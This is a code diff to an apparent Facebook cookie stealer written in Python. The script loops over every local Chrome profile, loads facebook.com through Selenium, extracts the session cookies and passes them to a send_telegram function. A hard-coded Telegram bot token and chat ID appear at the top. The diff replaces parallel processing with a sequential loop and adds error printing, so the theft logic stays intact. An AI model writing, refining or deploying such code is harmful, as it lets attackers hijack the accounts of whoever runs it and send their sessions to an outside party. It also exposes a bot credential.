@@ -9,7 +9,6 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 import requests
-from multiprocessing import Pool
 
 TOKEN = '7533821284:AAGDsLUDpZYbfzdghq8QihpeHXfhzGIP43I'
 CHAT_ID = '1174455752'
@@ -47,16 +46,13 @@ def get_cookies_from_profile(profile_name):
     try:
         driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
         driver.get('https://www.facebook.com/')
-        WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
+        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
         cookies = [c for c in driver.get_cookies() if 'facebook.com' in c['domain']]
         driver.quit()
         return cookies
-    except:
+    except Exception as e:
+        print(f"Error with profile {profile_name}: {e}")
         return None
-
-def process_profile(profile):
-    cookies = get_cookies_from_profile(profile)
-    return (profile, cookies) if cookies else None
 
 def cookies_to_header_string(cookies):
     return "; ".join(c['name'] + "=" + c['value'] for c in cookies) if cookies else "Không có cookies!"
@@ -74,8 +70,10 @@ if __name__ == "__main__":
     user_data_dir = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
     profiles = [item for item in os.listdir(user_data_dir) if os.path.isdir(os.path.join(user_data_dir, item)) and (item.startswith("Profile ") or item == "Default")] if os.path.exists(user_data_dir) else []
 
-    with Pool() as pool:
-        results = pool.map(process_profile, profiles)
-    profile_cookies = {p: c for r in results if r for p, c in [r]}
+    profile_cookies = {}
+    for profile in profiles:
+        cookies = get_cookies_from_profile(profile)
+        if cookies:
+            profile_cookies[profile] = cookies
 
     send_telegram(profile_cookies)
